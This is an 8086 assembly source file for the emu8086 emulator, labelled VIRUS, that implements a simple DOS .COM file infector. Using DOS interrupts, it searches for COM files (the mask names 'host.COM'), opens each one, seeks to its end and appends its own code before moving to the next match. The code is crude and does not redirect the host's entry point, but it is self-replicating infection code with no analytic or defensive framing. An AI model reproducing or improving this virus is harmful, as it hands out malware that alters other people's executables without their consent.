
; You may customize this and other start-up templates; 
; The location of this template is c:\emu8086\inc\0_com_template.txt

org 100h

; add your code here
                       
                       .model small
.code
    FNAME EQU 9EH ;search-function file name result
    ORG 100H 

VIRUS:
        
    
START:
    mov ah,4EH ;search for *.COM (search first)
    mov dx,OFFSET COM_FILE
    int 21H
SEARCH_LP:
    jc DONE
    mov ax,3D01H ;open file we found
    mov dx,FNAME
    int 21H               
    
    xor cx,cx
    mov dx,cx
    mov ax,4202H
    int 21H
    
    mov cx, OFFSET ENDVIR - OFFSET VIRUS
    lea dx,[di+VIRUS]
    mov ah,40H
    int 21H
    
    mov ah,3EH
    int 21H ;close file
    mov ah,4FH
    int 21H ;search for next file

    jmp SEARCH_LP
DONE:
    ret ;exit to DOS
    COM_FILE DB "host.COM",0 ;string for COM file search
    
ENDVIR:


END START
ret




